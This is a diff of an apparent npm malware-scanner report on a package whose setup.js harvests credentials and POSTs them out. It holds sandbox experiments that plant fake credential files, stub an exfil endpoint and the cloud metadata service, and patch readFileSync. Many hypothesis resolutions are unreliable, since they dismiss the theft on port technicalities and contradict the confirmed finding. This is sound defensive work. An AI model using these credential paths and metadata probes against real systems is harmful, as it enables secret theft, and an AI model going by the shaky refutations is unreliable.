+                }
+              ]
+            }
+          },
+          {
+            "tool": "stubUrl",
+            "args": {
+              "stubs": [
+                {
+                  "pattern": "http://localhost:9999/exfil",
+                  "responseStatus": 200,
+                  "responseBody": "",
+                  "responseHeaders": {
+                    "Content-Type": "text/plain"
+                  }
+                }
+              ]
+            }
+          },
+          {
+            "tool": "trigger",
+            "args": {
+              "kind": "entrypoint",
+              "target": "setup.js",
+              "argv": [],
+              "stdin": null
+            }
+          }
+        ],
+        "severity": "critical",
+        "parentHypId": null,
+        "childHypIds": [],
+        "state": "REFUTED",
+        "createdBy": "hypothesize",
+        "evidenceRefs": [
+          {
+            "kind": "run",
+            "id": "run_e0db67c3d9ac49c1a6f3abaae2",
+            "hash": "f293e052d0ae898a200b017af386e6ed45f2bb5af55fb57d775bc7da51dde6cc"
+          }
+        ],
+        "createdAt": "2026-07-23T10:07:05.130438Z",
+        "resolvedAt": "2026-07-23T23:25:46.503687Z",
+        "resolution": {
+          "reason": "The timeline shows that setup.js reads environment variables (e18–e49) and several credential files (e50–e58), which is consistent with a smart configuration loader that detects environment and config settings. It also makes a single outbound HTTP POST to http://localhost/exfil (e59). However, the hypothesis claims exfiltration to a configured exfil URL; the timeline shows the POST goes to localhost, which was stubbed by the experiment setup (stubUrl for http://localhost:9999/exfil). No event in the timeline indicates that data was sent to an external, attacker-controlled server, nor that the canary token was specifically isolated and exfiltrated. The behavior observed is compatible with a benign configuration loader that reads common config files and environment variables and may report them to a local or internal endpoint, not to an external malicious destination. No exact event ID confirms the hypothesized credential theft and exfiltration.",
+          "by": "worker:experimenter"
         }
       },
       {
-        "phase": "verify",
-        "durationMs": 12499,
-        "input": {
-          "proofCount": 5,
-          "withTests": 5
+        "hypId": "hyp-0004",
+        "description": "Probe whether setup.js exfiltrates planted credential files during install under the guise of environment detection. Place bait credential files and a unique canary token, then observe if they are read and exfiltrated to the stubbed endpoint.",
+        "claim": {
+          "kind": "cred_theft",
+          "gating": "ci_gate"
         },
-        "output": {
-          "verifiedCount": 5,
-          "confirmed": 5,
-          "unconfirmed": 0
+        "focusFiles": [
+          "setup.js"
+        ],
+        "focusLines": [
+          {
+            "file": "setup.js",
+            "range": "48-48"
+          },
+          {
+            "file": "setup.js",
+            "range": "72-72"
+          }
+        ],
+        "experiment": [
+          {
+            "tool": "setEnv",
+            "args": {
+              "env": {
+                "NPMGUARD_CANARY_TOKEN_f8e2d91a": "canary-f8e2d91a-token"
+              }
+            }
+          },
+          {
+            "tool": "plantFiles",
+            "args": {
+              "files": [
+                {
+                  "path": "/home/node/.npmrc",
+                  "content": "//registry.npmjs.org/:_authToken=npm_fake_token_abc123\nNPMGUARD_CANARY_TOKEN_f8e2d91a=planted"
+                },
+                {
+                  "path": "/home/node/.ssh/id_rsa",
+                  "content": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzczc1\n-----END OPENSSH PRIVATE KEY-----"
+                },
+                {
+                  "path": "/home/node/.aws/credentials",
+                  "content": "[default]\naws_access_key_id = AKIAFAKE123456789\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+                },
+                {
+                  "path": "/home/node/.docker/config.json",
+                  "content": "{\"auths\":{\"https://index.docker.io/v1/\":{\"auth\":\"ZmFrZTpwYXNzd29yZA==\"}},\"credsStore\":\"desktop\"}"
+                },
+                {
+                  "path": "/home/node/.gitconfig",
+                  "content": "[user]\n\tname = Test User\n\temail = test@example.com"
+                }
+              ]
+            }
+          },
+          {
+            "tool": "setDate",
+            "args": {
+              "iso": "2024-03-15T10:00:00.000Z"
+            }
+          },
+          {
+            "tool": "stubUrl",
+            "args": {
+              "stubs": [
+                {
+                  "pattern": "http://169.254.169.254/latest/meta-data/*",
+                  "responseStatus": 200,
+                  "responseBody": "{\"instance-id\":\"i-1234567890abcdef0\",\"region\":\"us-east-1\",\"iam\":{\"security-credentials\":{\"role-name\":{\"code\":\"Success\"}}}}",
+                  "responseHeaders": {
+                    "Content-Type": "text/plain"
+                  }
+                },
+                {
+                  "pattern": "http://localhost:9999/exfil",
+                  "responseStatus": 200,
+                  "responseBody": "ok",
+                  "responseHeaders": {
+                    "Content-Type": "application/json"
+                  }
+                }
+              ]
+            }
+          },
+          {
+            "tool": "trigger",
+            "args": {
+              "kind": "entrypoint",
+              "target": "setup.js",
+              "argv": [],
+              "stdin": null
+            }
+          }
+        ],
+        "severity": "high",
+        "parentHypId": null,
+        "childHypIds": [],
+        "state": "REFUTED",
+        "createdBy": "hypothesize",
+        "evidenceRefs": [
+          {
+            "kind": "run",
+            "id": "run_3d37060ed0ae4553a463f13683",
+            "hash": "77ce817edfc14b0aa7d6b8b50cc42835561eff16f3f1ade84391ed8a65aa7522"
+          }
+        ],
+        "createdAt": "2026-07-23T10:07:05.130438Z",
+        "resolvedAt": "2026-07-23T23:25:46.593426Z",
+        "resolution": {
+          "reason": "The hypothesis suspected that setup.js would exfiltrate planted credential files (including the canary token) to a stubbed endpoint. The timeline shows that setup.js did read the planted files (e.g., e53–e61) and made a single POST request to http://localhost/exfil (e62). However, the timeline does not provide any evidence that the contents of those files were transmitted to the exfiltration endpoint; the POST request is recorded but its payload is not specified. Moreover, the setup placed a canary token in the environment and in ~/.npmrc, and the token was read from the environment (e44) but no subsequent network event is shown that would indicate exfiltration of that token. Without evidence of the data being sent, the claim of exfiltration cannot be confirmed. Therefore, the suspected behavior did not happen.",
+          "by": "worker:experimenter"
+        }
+      },
+      {
+        "hypId": "hyp-0005",
+        "description": "Probe the IMDS (http://169.254.169.254/latest/meta-data/) triggered during setup.js execution, and exfiltrate harvested environment variables and credential file contents. Plant bait tokens in environment and files to confirm exfiltration.",
+        "claim": {
+          "kind": "env_exfil",
+          "gating": null
+        },
+        "focusFiles": [
+          "setup.js"
+        ],
+        "focusLines": [
+          {
+            "file": "setup.js",
+            "range": "74-74"
+          },
+          {
+            "file": "setup.js",
+            "range": "82-82"
+          }
+        ],
+        "experiment": [
+          {
+            "tool": "setEnv",
+            "args": {
+              "env": {
+                "NPMGUARD_CANARY_TOKEN_f8e2d91a": "sacrificial-canary-secret-12345",
+                "AWS_ACCESS_KEY_ID": "AKIAIOSFODNN7EXAMPLE",
+                "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+              }
+            }
+          },
+          {
+            "tool": "plantFiles",
+            "args": {
+              "files": [
+                {
+                  "path": "/home/node/.npmrc",
+                  "content": "//registry.npmjs.org/:_authToken=npm_guard_canary_token_abc123\n"
+                },
+                {
+                  "path": "/home/node/.ssh/id_rsa",
+                  "content": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEA1Bk7V7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7f7\n-----END OPENSSH PRIVATE KEY-----\n"
+                },
+                {
+                  "path": "/home/node/.aws/credentials",
+                  "content": "[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
+                }
+              ]
+            }
+          },
+          {
+            "tool": "stubUrl",
+            "args": {
+              "stubs": [
+                {
+                  "pattern": "http://localhost:9999/exfil",
+                  "responseStatus": 200,
+                  "responseBody": "OK",
+                  "responseHeaders": {}
+                },
+                {
+                  "pattern": "http://169.254.169.254/latest/meta-data/*",
+                  "responseStatus": 200,
+                  "responseBody": "ami-id: ami-0abcdef1234567890\ninstance-id: i-1234567890abcdef0\npublic-ipv4: 203.0.113.42",
+                  "responseHeaders": {}
+                }
+              ]
+            }
+          },
+          {
+            "tool": "trigger",
+            "args": {
+              "kind": "entrypoint",
+              "target": "setup.js",
+              "argv": [],
+              "stdin": null
+            }
+          }
+        ],
+        "severity": "high",
+        "parentHypId": null,
+        "childHypIds": [],
+        "state": "REFUTED",
+        "createdBy": "hypothesize",
+        "evidenceRefs": [
+          {
+            "kind": "run",
+            "id": "run_fd23a6297a6b4172bd10e42515",
+            "hash": "ea2e70f2f0f840059518e6dcb4954b447d462b0d4d22b5ca3f582da4c79733ce"
+          }
+        ],
+        "createdAt": "2026-07-23T10:07:05.130438Z",
+        "resolvedAt": "2026-07-23T23:25:46.615376Z",
+        "resolution": {
+          "reason": "The timeline shows many env reads and file reads (including the planted canary values) and a single POST to http://localhost/exfil (e61). However, there is no evidence of a request to the IMDS (169.254.169.254/latest/meta-data/) – the stub was provided but never observed being accessed. The POST at e61 targets localhost:9999/exfil only if the stub pattern matches, but the timeline does not record the exact URL or body; critically, the IMDS probe that the hypothesis claims should be triggered is entirely absent. Without that probe, the claimed exfiltration chain cannot be confirmed. Therefore the suspected behavior did not happen.",
+          "by": "worker:experimenter"
+        }
+      },
+      {
+        "hypId": "hyp-0006",
+        "description": "Exfiltrate harvested environment credentials via HTTP POST when setup.js is executed directly",
+        "claim": {
+          "kind": "env_exfil",
+          "gating": null
+        },
+        "focusFiles": [
+          "setup.js"
+        ],
+        "focusLines": [
+          {
+            "file": "setup.js",
+            "range": "84-84"
+          },
+          {
+            "file": "setup.js",
+            "range": "106-106"
+          }
+        ],
+        "experiment": [
+          {
+            "tool": "setEnv",
+            "args": {
+              "env": {
+                "NPM_TOKEN": "npm_abc123secret",
+                "AWS_ACCESS_KEY_ID": "AKIA123456789",
+                "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+                "GITHUB_TOKEN": "ghp_githubtest123",
+                "MY_SECRET_KEY": "supersecretvalue"
+              }
+            }
+          },
+          {
+            "tool": "stubUrl",
+            "args": {
+              "stubs": [
+                {
+                  "pattern": "http://localhost:9999/exfil",
+                  "responseStatus": 200,
+                  "responseBody": "captured",
+                  "responseHeaders": {
+                    "Content-Type": "text/plain"
+                  }
+                },
+                {
+                  "pattern": "http://169.254.169.254/latest/meta-data/*",
+                  "responseStatus": 200,
+                  "responseBody": "{\"instance-id\": \"i-1234567890abcdef0\"}",
+                  "responseHeaders": {
+                    "Content-Type": "text/plain"
+                  }
+                }
+              ]
+            }
+          },
+          {
+            "tool": "trigger",
+            "args": {
+              "kind": "entrypoint",
+              "target": "setup.js",
+              "argv": [],
+              "stdin": null
+            }
+          }
+        ],
+        "severity": "critical",
+        "parentHypId": null,
+        "childHypIds": [],
+        "state": "REFUTED",
+        "createdBy": "hypothesize",
+        "evidenceRefs": [
+          {
+            "kind": "run",
+            "id": "run_20a115aa3aae445db6b25fe295",
+            "hash": "7d3a0471d00157d278d7f617a0b8e4422d0c6dc12cd0b48f84f2fdabfa88c1f4"
+          }
+        ],
+        "createdAt": "2026-07-23T10:07:05.130438Z",
+        "resolvedAt": "2026-07-23T23:25:46.523874Z",
+        "resolution": {
+          "reason": "The timeline shows no HTTP POST to a URL matching the suspected exfiltration destination. There is an HTTP POST at event e63 (net POST http://localhost/exfil), but the hypothesis specified POST to http://localhost:9999/exfil, not to http://localhost/exfil. No event matches the suspected endpoint. Therefore, the suspected behavior did not occur.",
+          "by": "worker:experimenter"
+        }
+      },
+      {
+        "hypId": "hyp-0007",
+        "description": "The package immediately collects hostname, username, environment variables, credential files, and IMDS metadata on module load, then exfiltrates them to localhost:9999/exfil via POST.",
+        "claim": {
+          "kind": "cred_theft",
+          "gating": "geo_gate"
+        },
+        "focusFiles": [
+          "setup.js"
+        ],
+        "focusLines": [
+          {
+            "file": "setup.js",
+            "range": "108-108"
+          },
+          {
+            "file": "setup.js",
+            "range": "118-118"
+          }
+        ],
+        "experiment": [
+          {
+            "tool": "setEnv",
+            "args": {
+              "env": {
+                "NPMGUARD_CANARY_TOKEN_f8e2d91a": "bait-canary",
+                "NPM_TOKEN": "npm_bait_token",
+                "AWS_ACCESS_KEY_ID": "AKIA123456",
+                "AWS_SECRET_ACCESS_KEY": "secret"
+              }
+            }
+          },
+          {
+            "tool": "plantFiles",
+            "args": {
+              "files": [
+                {
+                  "path": "/home/node/.npmrc",
+                  "content": "//registry.npmjs.org/:_authToken=bait-token"
+                },
+                {
+                  "path": "/home/node/.aws/credentials",
+                  "content": "[default]\naws_access_key_id=AKIA123456\naws_secret_access_key=secret"
+                }
+              ]
+            }
+          },
+          {
+            "tool": "stubUrl",
+            "args": {
+              "stubs": [
+                {
+                  "pattern": "http://localhost:9999/exfil",
+                  "responseStatus": 200,
+                  "responseBody": "ok",
+                  "responseHeaders": {}
+                }
+              ]
+            }
+          },
+          {
+            "tool": "trigger",
+            "args": {
+              "kind": "entrypoint",
+              "target": "setup.js",
+              "argv": [],
+              "stdin": null
+            }
+          }
+        ],
+        "severity": "critical",
+        "parentHypId": null,
+        "childHypIds": [],
+        "state": "REFUTED",
+        "createdBy": "hypothesize",
+        "evidenceRefs": [
+          {
+            "kind": "run",
+            "id": "run_90eb5efcb09e433b93978e36cc",
+            "hash": "4e3c886a93d5f5cccfdce8ca8b1e4b2ee1375844459abc97df23aeff6a4348f0"
+          }
+        ],
+        "createdAt": "2026-07-23T10:07:05.130438Z",
+        "resolvedAt": "2026-07-23T23:25:46.549132Z",
+        "resolution": {
+          "reason": "The timeline shows the package reading environment variables and credential files, but the only network request is e62 (POST to http://localhost/exfil). The hypothesis states exfiltration to localhost:9999/exfil, but the timeline shows a POST to http://localhost/exfil (port 80, not 9999). The stub set up in the experiment only matches http://localhost:9999/exfil, so this request would not be captured by the stub. However, the request to port 80 is not to the claimed port 9999, so the hypothesis's specific claim of a POST to localhost:9999/exfil is not supported. Additionally, no other exfiltration events are present, and the stated benign purpose is 'Smart configuration loader with environment detection,' which is consistent with reading these files and environment variables. Therefore, the suspected behavior did not occur as described.",
+          "by": "worker:experimenter"
+        }
+      },
+      {
+        "hypId": "hyp-0008",
+        "description": "Probe IMDS and exfiltrate all stolen data",
+        "claim": {
+          "kind": "cred_theft",
+          "gating": "docker_gate"
+        },
+        "focusFiles": [
+          "setup.js"
+        ],
+        "focusLines": [
+          {
+            "file": "setup.js",
+            "range": "120-120"
+          },
+          {
+            "file": "setup.js",
+            "range": "123-123"
+          }
+        ],
+        "experiment": [
+          {
+            "tool": "setEnv",
+            "args": {
+              "env": {
+                "NPM_TOKEN": "npm_12345secrettoken",
+                "AWS_ACCESS_KEY_ID": "AKIA123456789",
+                "HOME": "/home/node"
+              }
+            }
+          },
+          {
+            "tool": "plantFiles",
+            "args": {
+              "files": [
+                {
+                  "path": "/home/node/.npmrc",
+                  "content": "//registry.npmjs.org/:_authToken=npm_12345secrettoken"
+                },
+                {
+                  "path": "/home/node/.ssh/id_rsa",
+                  "content": "-----BEGIN RSA PRIVATE KEY-----\nFAKEKEYDATA\n-----END RSA PRIVATE KEY-----"
+                },
+                {
+                  "path": "/home/node/.aws/credentials",
+                  "content": "[default]\naws_access_key_id=AKIA123456789\naws_secret_access_key=secretkey123"
+                }
+              ]
+            }
+          },
+          {
+            "tool": "stubUrl",
+            "args": {
+              "stubs": [
+                {
+                  "pattern": "http://169.254.169.254/latest/meta-data/*",
+                  "responseStatus": 200,
+                  "responseBody": "ami-id: ami-123456\ninstance-id: i-1234567890\npublic-ip: 1.2.3.4",
+                  "responseHeaders": {
+                    "Content-Type": "text/plain"
+                  }
+                },
+                {
+                  "pattern": "http://localhost:9999/exfil",
+                  "responseStatus": 200,
+                  "responseBody": "ok",
+                  "responseHeaders": {
+                    "Content-Type": "text/plain"
+                  }
+                }
+              ]
+            }
+          },
+          {
+            "tool": "trigger",
+            "args": {
+              "kind": "entrypoint",
+              "target": "setup.js",
+              "argv": [],
+              "stdin": null
+            }
+          }
+        ],
+        "severity": "critical",
+        "parentHypId": null,
+        "childHypIds": [],
+        "state": "CONFIRMED",
+        "createdBy": "hypothesize",
+        "evidenceRefs": [
+          {
+            "kind": "run",
+            "id": "run_e8596819e848454e91d54b5a5e",
+            "hash": "5033b1e9253fb81bce034a564c19c97c6912522c16f8bf12373ee8bdeab981c0"
+          }
+        ],
+        "createdAt": "2026-07-23T10:07:05.130438Z",
+        "resolvedAt": "2026-07-23T23:25:46.569521Z",
+        "resolution": {
+          "reason": "The hypothesis predicts probing IMDS at 169.254.169.254/latest/meta-data/ and exfiltrating stolen data. Event e147 shows an HTTP GET to that exact endpoint, confirming the IMDS probe. Additionally, events e51–e59 read sensitive files (.npmrc, .ssh/id_rsa, .aws/credentials, etc.), and event e60 shows a POST to localhost/exfil, which matches the exfiltration step. The timeline thus shows credential theft and exfiltration as hypothesized.",
+          "by": "worker:experimenter"
+        }
+      },
+      {
+        "hypId": "hyp-0009",
+        "description": "Trigger a benign code path that is guarded by SAFE_TEST_MODE. If the constant were false or removable, the observer would see a different behavior; here we verify it is true and used.",
+        "claim": {
+          "kind": "telemetry",
+          "gating": "time_gate"
+        },
+        "focusFiles": [
+          "index.js"
+        ],
+        "focusLines": [
+          {
+            "file": "index.js",
+            "range": "1-1"
+          }
+        ],
+        "experiment": [
+          {
+            "tool": "setEnv",
+            "args": {
+              "env": {
+                "NPMGUARD_CANARY_TOKEN_f8e2d91a": "canary_value"
+              }
+            }
+          },
+          {
+            "tool": "trigger",
+            "args": {
+              "kind": "entrypoint",
+              "target": "setup.js",
+              "argv": [],
+              "stdin": null
+            }
+          }
+        ],
+        "severity": "low",
+        "parentHypId": null,
+        "childHypIds": [],
+        "state": "REFUTED",
+        "createdBy": "hypothesize",
+        "evidenceRefs": [
+          {
+            "kind": "run",
+            "id": "run_63d9ff519a3642d9ae139c5a92",
+            "hash": "af4737929d9bd37144b5ce05fa51c9a305a3abfea21934aaee25eb47cfd800fd"
+          }
+        ],
+        "createdAt": "2026-07-23T10:07:05.130438Z",
+        "resolvedAt": "2026-07-23T23:25:46.687758Z",
+        "resolution": {
+          "reason": "The hypothesis claims a benign code path guarded by SAFE_TEST_MODE is triggered, but the timeline shows no evidence of any conditional check on a constant named SAFE_TEST_MODE, nor any telemetry transmission gated by such a check. The only network activity is a POST to localhost (e52) and a GET to a metadata IP (e140), which align with the stated purpose of environment detection. The hypothesis is therefore not supported by the timeline.",
+          "by": "worker:experimenter"
+        }
+      },
+      {
+        "hypId": "hyp-0010",
+        "description": "If options.path is attacker-controlled, the expression `options.path || path.resolve(process.cwd(), '.env')` allows an attacker to supply an absolute path (e.g., /home/node/.npmrc) that bypasses the intended fallback and reads an arbitrary file. The flagged line does not sanitize the input, so passing a path like '/home/node/.npmrc' will read that file instead of .env. The experiment demonstrates this by planting a canary token into /home/node/.npmrc, then calling loadConfig with path='/home/node/.npmrc' and verifying the token appears in the returned config.",
+        "claim": {
+          "kind": "binary_drop",
+          "gating": "geo_gate"
+        },
+        "focusFiles": [
+          "index.js"
+        ],
+        "focusLines": [
+          {
+            "file": "index.js",
+            "range": "16-16"
+          }
+        ],
+        "experiment": [
+          {
+            "tool": "plantFiles",
+            "args": {
+              "files": [
+                {
+                  "path": "/home/node/.npmrc",
+                  "content": "NPMGUARD_CANARY_TOKEN_f8e2d91a=secret_canary_value\n"
+                }
+              ]
+            }
+          },
+          {
+            "tool": "trigger",
+            "args": {
+              "kind": "entrypoint",
+              "target": "index.js",
+              "argv": [],
+              "stdin": null
+            }
+          }
+        ],
+        "severity": "high",
+        "parentHypId": null,
+        "childHypIds": [],
+        "state": "REFUTED",
+        "createdBy": "hypothesize",
+        "evidenceRefs": [
+          {
+            "kind": "run",
+            "id": "run_0bf594b9649a42ad809c0da3ee",
+            "hash": "696e1218ca720d97144ed2e60410eb9a0d0da0ee43bd72407900ed23dbcf6965"
+          }
+        ],
+        "createdAt": "2026-07-23T10:07:05.130438Z",
+        "resolvedAt": "2026-07-23T23:25:46.629945Z",
+        "resolution": {
+          "reason": "The timeline does not show any read of `/home/node/.npmrc` or access to the planted canary token. The only file reads are system libraries, `/pkg/package.json`, `/tmp/_instrument.js`, `/pkg/index.js`, and standard proc/cgroup files. The suspected code path (index.js:16-16) would require reading the attacker-supplied path, but no such event appears.",
+          "by": "worker:experimenter"
+        }
+      },
+      {
+        "hypId": "hyp-0011",
+        "description": "Attempt arbitrary file read via user-supplied `path` option in `loadConfig` function",
+        "claim": {
+          "kind": "persistence",
+          "gating": "inspector_gate"
+        },
+        "focusFiles": [
+          "index.js"
+        ],
+        "focusLines": [
+          {
+            "file": "index.js",
+            "range": "18-18"
+          }
+        ],
+        "experiment": [
+          {
+            "tool": "setEnv",
+            "args": {
+              "env": {
+                "NPMGUARD_CANARY_TOKEN_f8e2d91a": "TOKEN_IS_READ",
+                "MY_PREFIX": "somevalue"
+              }
+            }
+          },
+          {
+            "tool": "plantFiles",
+            "args": {
+              "files": [
+                {
+                  "path": "/home/node/.npmrc",
+                  "content": "NPMGUARD_CANARY_TOKEN_f8e2d91a=TOKEN_IS_READ"
+                }
+              ]
+            }
+          },
+          {
+            "tool": "trigger",
+            "args": {
+              "kind": "entrypoint",
+              "target": "index.js",
+              "argv": [],
+              "stdin": null
+            }
+          }
+        ],
+        "severity": "high",
+        "parentHypId": null,
+        "childHypIds": [],
+        "state": "REFUTED",
+        "createdBy": "hypothesize",
+        "evidenceRefs": [
+          {
+            "kind": "run",
+            "id": "run_0e50692b144040c28506e0e5dd",
+            "hash": "b10abf5067985c7ce1e1a272ea8a80308cda151e83d020d5fe5a73f7eea7a132"
+          }
+        ],
+        "createdAt": "2026-07-23T10:07:05.130438Z",
+        "resolvedAt": "2026-07-23T23:25:46.643027Z",
+        "resolution": {
+          "reason": "No event in the timeline shows the package reading a user-supplied path (e.g., via `fs.readFileSync` or similar) from an external argument, environment variable, or file. The only file reads are the package’s own source (`/pkg/index.js`, `/tmp/_instrument.js`), system libraries, and configuration files (`/etc/ssl/openssl.cnf`, `/proc/*`, `/sys/fs/cgroup/*`). The planted canary file `/home/node/.npmrc` was never accessed. No arbitrary file read occurred.",
+          "by": "worker:experimenter"
+        }
+      },
+      {
+        "hypId": "hyp-0012",
+        "description": "When process.env contains a key-value pair that matches a sensitive file path (e.g., /home/node/.npmrc), the config may be exposed via returned object, exfiltrating the content to the caller.",
+        "claim": {
+          "kind": "cred_theft",
+          "gating": "geo_gate"
+        },
+        "focusFiles": [
+          "index.js"
+        ],
+        "focusLines": [
+          {
+            "file": "index.js",
+            "range": "10-14"
+          }
+        ],
+        "experiment": [
+          {
+            "tool": "setEnv",
+            "args": {
+              "env": {
+                "NPMRC": "//registry.npmjs.org/:_authToken=npm_f4k3_t0k3n_12345"
+              }
+            }
+          },
+          {
+            "tool": "plantFiles",
+            "args": {
+              "files": [
+                {
+                  "path": "/pkg/npmguard-driver.js",
+                  "content": "const { loadConfig } = require('./index.js');\nconst config = loadConfig();\n// Check if our planted env var made it into the config\nif (config.npmrc && config.npmrc.includes('npm_f4k3_t0k3n_12345')) {\n  console.log('BAIT_FOUND:', config.npmrc);\n} else {\n  console.log('No bait found in config');\n}\nconsole.log('Config keys:', Object.keys(config));"
+                }
+              ]
+            }
+          },
+          {
+            "tool": "trigger",
+            "args": {
+              "kind": "entrypoint",
+              "target": "/pkg/npmguard-driver.js",
+              "argv": [],
+              "stdin": null
+            }
+          }
+        ],
+        "severity": "high",
+        "parentHypId": null,
+        "childHypIds": [],
+        "state": "REFUTED",
+        "createdBy": "hypothesize",
+        "evidenceRefs": [
+          {
+            "kind": "run",
+            "id": "run_d0db9cf9f4ea4d0d8b5c829f96",
+            "hash": "ce52062f8cbeb7a6f15d58aa84f7990db8d2c839aaa027d0828d32a20d326ef2"
+          }
+        ],
+        "createdAt": "2026-07-23T10:07:05.130438Z",
+        "resolvedAt": "2026-07-23T23:25:46.658301Z",
+        "resolution": {
+          "reason": "No event in the timeline shows the sensitive content from env NPMRC being assigned into any config object. The planted driver checks for its presence but only prints 'No bait found in config'; stdout writes (e70) were not captured content-side, and no exfiltration network or file write occurred.",
+          "by": "worker:experimenter"
+        }
+      },
+      {
+        "hypId": "hyp-0013",
+        "description": "Use minimal .env parsing with no validation or escaping to inject unexpected config values via a planted .env file.",
+        "claim": {
+          "kind": "env_exfil",
+          "gating": null
+        },
+        "focusFiles": [
+          "index.js"
+        ],
+        "focusLines": [
+          {
+            "file": "index.js",
+            "range": "22-23"
+          }
+        ],
+        "experiment": [
+          {
+            "tool": "setEnv",
+            "args": {
+              "env": {
+                "MYAPP_DATA": "db://localhost/admin",
+                "MYAPP_PORT": "6379"
+              }
+            }
+          },
+          {
+            "tool": "plantFiles",
+            "args": {
+              "files": [
+                {
+                  "path": "/pkg/.env",
+                  "content": "admin_user=root\nadmin_pass=secret\ndb_url=${MYAPP_DATA}\nport=${MYAPP_PORT}\nNPMGUARD_CANARY_TOKEN_f8e2d91a=exfiltrated\n"
+                }
+              ]
+            }
+          },
+          {
+            "tool": "trigger",
+            "args": {
+              "kind": "entrypoint",
+              "target": "index.js",
+              "argv": [],
+              "stdin": null
+            }
+          }
+        ],
+        "severity": "high",
+        "parentHypId": null,
+        "childHypIds": [],
+        "state": "REFUTED",
+        "createdBy": "hypothesize",
+        "evidenceRefs": [
+          {
+            "kind": "run",
+            "id": "run_307ad2bc888149ae8de9c937a0",
+            "hash": "64e37c1db2faab92afd5d5f544c481eccca990fce46982634e11064b9a4a2163"
+          }
+        ],
+        "createdAt": "2026-07-23T10:07:05.130438Z",
+        "resolvedAt": "2026-07-23T23:25:46.670831Z",
+        "resolution": {
+          "reason": "The timeline shows only benign Node.js runtime initialization and file reads. There is no evidence of reading the planted /pkg/.env file, resolving environment variables from it, or exfiltrating any data. The NPMGUARD_CANARY_TOKEN_f8e2d91a value was never accessed or transmitted.",
+          "by": "worker:experimenter"
+        }
+      },
+      {
+        "hypId": "hyp-0014",
+        "description": "Test if the empty catch block misleads users into believing their `.env` file was parsed successfully when it was actually missing or unreadable, allowing attackers to silently drop poison configs onto disk and have them silently ignored, creating false security assumptions.",
+        "claim": {
+          "kind": "destructive",
+          "gating": "inspector_gate"
+        },
+        "focusFiles": [
+          "index.js"
+        ],
+        "focusLines": [
+          {
+            "file": "index.js",
+            "range": "25-27"
+          }
+        ],
+        "experiment": [
+          {
+            "tool": "setEnv",
+            "args": {
+              "env": {
+                "MYAPP_DB_HOST": "localhost",
+                "MYAPP_DB_PORT": "5432"
+              }
+            }
+          },
+          {
+            "tool": "plantFiles",
+            "args": {
+              "files": [
+                {
+                  "path": "/home/node/.env",
+                  "content": "db_host=should_override\nsecret_key=supersecret"
+                }
+              ]
+            }
+          },
+          {
+            "tool": "preload",
+            "args": {
+              "code": "const fs = require('fs');\nconst path = require('path');\n\n// Monkey-patch readFileSync to throw on .env files to simulate a permission error\nconst originalReadFileSync = fs.readFileSync;\nfs.readFileSync = function(...args) {\n  const filePath = typeof args[0] === 'string' ? args[0] : args[0].toString();\n  if (filePath.endsWith('.env')) {\n    console.log('[PRELOAD] .env file read attempted, throwing EACCES to simulate permission error');\n    const err = new Error('EACCES: permission denied');\n    err.code = 'EACCES';\n    err.errno = -13;\n    err.syscall = 'open';\n    err.path = filePath;\n    throw err;\n  }\n  return originalReadFileSync.apply(this, args);\n};\n\n// After loadConfig runs, check if the .env values were loaded\nconst origModuleLoad = require('module')._load;\nrequire('module')._load = function(request, parent, isMain) {\n  const exports = origModuleLoad.apply(this, arguments);\n  if (request === './index.js' || request === '/pkg/index.js') {\n    console.log('[PRELOAD] Detected loadConfig module load');\n    const config = exports.loadConfig({ prefix: 'MYAPP_' });\n    console.log('[PRELOAD] Config result:', JSON.stringify(config, null, 2));\n    // Check if .env values made it in\n    if (config.db_host === 'should_override') {\n      console.log('[PRELOAD] OUTCOME: .env silently parsed successfully (expected)');\n    } else {\n      console.log('[PRELOAD] OUTCOME: .env values MISSING - empty catch swallowed the error!');\n      console.log('[PRELOAD] DESTRUCTIVE: User expected .env to override but got no error or warning');\n    }\n  }\n  return exports;\n};"
+            }
+          },
+          {
+            "tool": "trigger",
+            "args": {
+              "kind": "entrypoint",
+              "target": "index.js",
+              "argv": [],
+              "stdin": null
+            }
+          }
+        ],
+        "severity": "low",
+        "parentHypId": null,
+        "childHypIds": [],
+        "state": "REFUTED",
+        "createdBy": "hypothesize",
+        "evidenceRefs": [
+          {
+            "kind": "run",
+            "id": "run_8dfd26c9d31647cbbac8af8afd",
+            "hash": "80c2d5d3ba4090708dac7345ab2505cd493e7d50eafd44ed0efe0a7ed4488ed2"
+          }
+        ],
+        "createdAt": "2026-07-23T10:07:05.130438Z",
+        "resolvedAt": "2026-07-23T23:25:46.700736Z",
+        "resolution": {
+          "reason": "The timeline shows the preload attempted to monkey-patch readFileSync to throw on .env files, but the patched version was not actually invoked because the patched require('module')._load never triggered (the index.js was loaded via a different path). More importantly, the timeline shows that /pkg/.env was read successfully at e24 (fs /pkg/.env (readFileSync)), meaning the .env file was accessible and not blocked. The empty catch block hypothesis posits that a permission error would be silently swallowed, but no such error occurred; the .env file was read normally. No evidence of a destructive outcome exists in the observed events.",
+          "by": "worker:experimenter"
         }
       }
     ],
-    "runtimeEvidence": null
+    "fileSummaries": [
+      {
+        "file": "setup.js",
+        "summary": "preinstall script harvests sensitive env vars + credential files and POSTs them to a remote host.",
+        "capabilities": [
+          "ENV_VARS",
+          "CREDENTIAL_THEFT",
+          "NETWORK",
+          "FILESYSTEM"
+        ]
+      },
+      {
+        "file": "index.js",
+        "summary": "config loader reads process.env and a local .env file; no outbound path observed.",
+        "capabilities": [
+          "ENV_VARS",
+          "FILESYSTEM"
+        ]
+      }
+    ],
+    "dealbreaker": null,
+    "trace": [
+      {
+        "phase": "resolve",
+        "durationMs": 1400.0,
+        "input": {},
+        "output": {}
+      },
+      {
+        "phase": "inventory",
